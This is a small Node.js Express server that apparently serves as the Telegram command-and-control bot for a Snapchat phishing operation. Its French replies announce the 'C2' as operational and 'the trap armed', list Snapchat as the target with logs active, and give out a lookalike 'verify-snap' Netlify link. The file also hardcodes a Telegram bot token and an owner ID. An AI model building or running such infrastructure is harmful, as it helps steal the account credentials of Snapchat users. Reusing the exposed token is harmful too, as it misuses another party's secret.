const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

const TOKEN = '9056543484:AAF6uHfX6Kl-TcHGd3JVn5GlXMLPGIJg_z8';
const OWNER_ID = '8379339734';

app.post(`/bot${TOKEN}`, async (req, res) => {
    const { message } = req.body;
    
    if (message && message.text) {
        const chatId = message.chat.id.toString();
        const text = message.text;

        if (chatId !== OWNER_ID) return res.sendStatus(403);

        let reply = "";
        if (text === '/start') reply = "👻 C2 Opérationnel. Le piège est armé.";
        else if (text === '/help') reply = "Commandes : /start, /ping, /stats, /link";
        else if (text === '/ping') reply = "🏓 Pong ! Le bot est en ligne.";
        else if (text === '/stats') reply = "📊 Status: Actif\nCible: Snapchat\nLogs: Actifs";
        else if (text === '/link') reply = "🔗 Lien : https://verify-snap.netlify.app";
        else reply = "Commande inconnue.";

        try {
            await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: chatId, text: reply, parse_mode: 'HTML'
            });
        } catch (e) {}
    }
    res.sendStatus(200);
});

app.listen(process.env.PORT || 3000);
